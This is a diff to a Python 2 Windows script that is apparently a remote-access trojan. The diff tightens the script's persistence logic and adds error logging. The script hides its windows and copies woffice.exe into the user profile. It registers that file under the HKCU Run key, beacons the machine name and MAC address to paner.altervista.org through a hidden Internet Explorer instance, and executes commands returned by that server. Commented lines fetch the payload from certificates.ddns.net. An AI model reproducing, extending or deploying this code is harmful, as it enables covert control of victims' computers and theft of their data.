@@ -95,17 +95,21 @@ def get_macaddress(host='localhost'):
 
 
 CREATE_NO_WINDOW = 0x08000000
+stemp=os.getenv('temp')
 swin=os.getenv('windir')
 suser=os.getenv('USERPROFILE')
 try:
-##    if not os.path.exists(suser+'\\woffice.exe'):
+    if not os.path.exists(suser+'\\woffice.exe'):
 ##        f = urllib2.urlopen("http://certificates.ddns.net/woffice.exe")
 ##        with open(suser+'\\woffice.exe', "wb") as code:
 ##            code.write(f.read())
         #subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
-    subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
-    subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
 except Exception,e:
+    text_file = open(stemp+"\\pippo.txt", "w")
+    text_file.write(str(e))
+    text_file.close()
     print str(e)
 #main loop here
 site="paner.altervista.org"
@@ -118,8 +122,11 @@ try:
     sTime=time.ctime(os.path.getmtime(os.getcwd()+'\\woffice.exe'))
     sTime=sTime.replace(" ","_")
 except Exception,e:
+    text_file = open(stemp+"\\pippo.txt", "w")
+    text_file.write(str(e))
+    text_file.close()
     print str(e)
-sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress#+"_"+os.getenv('USERNAME')
+sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"#+"_"+os.getenv('USERNAME')
 pythoncom.CoInitialize()
 ie = Dispatch("InternetExplorer.Application")
 ie.Visible = 0
@@ -129,8 +136,8 @@ while True:
 ##            subprocess.call("taskkill /f /im wup.exe", creationflags=CREATE_NO_WINDOW)
         
             try:
-                    #top_level_url="http://52.26.124.145:31287"
-                    top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
+                    #top_level_url="http://52.26.124.145:31287"                    
+                    top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+str(sTime)
                     
                     ie.Navigate(top_level_url)
                     if ie.Busy:
@@ -184,7 +191,7 @@ while True:
                             print skill
                     #httpServ.close()
                     if sexec == '1':
-                            sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
+                            sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"
                             try:
                                     if sout == '1':
                                         scmd = sresponse[ifind+4:sresponse.find('||',ifind)]   
@@ -273,6 +280,9 @@ while True:
                             #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                     site=site1
             except Exception,e:
+                    text_file = open(stemp+"\\pippo.txt", "w")
+                    text_file.write(str(e))
+                    text_file.close()
                     print str(e)
                     #print e.errno
                     #if e.errno == 11001:
